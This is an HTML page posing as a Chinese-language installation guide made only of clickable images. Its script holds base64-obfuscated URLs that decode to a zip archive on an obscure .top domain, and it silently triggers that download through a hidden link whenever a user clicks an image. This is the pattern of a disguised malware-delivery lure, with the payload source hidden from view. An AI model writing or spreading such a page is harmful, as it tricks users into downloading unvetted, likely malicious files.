<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安装指南</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <img src="images/img_01.jpg">
    <img src="images/img_02.jpg">
    <img src="images/img_03.jpg">
    <img src="images/img_04.jpg">
    <img src="images/img_05.jpg">

    <script>
        function decodeBase64(data) {
            return atob(data);
        }

        const targets = [
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA='
        ];

        const pics = document.querySelectorAll('img');

        pics.forEach((img, idx) => {
            img.addEventListener('click', () => {
                const anchor = document.createElement('a');
                anchor.style.display = 'none';
                anchor.href = decodeBase64(targets[idx]);
                anchor.rel = 'nofollow';
                document.body.appendChild(anchor);
                anchor.click();
                document.body.removeChild(anchor);
            });
        });
    </script>

</body>
</html>
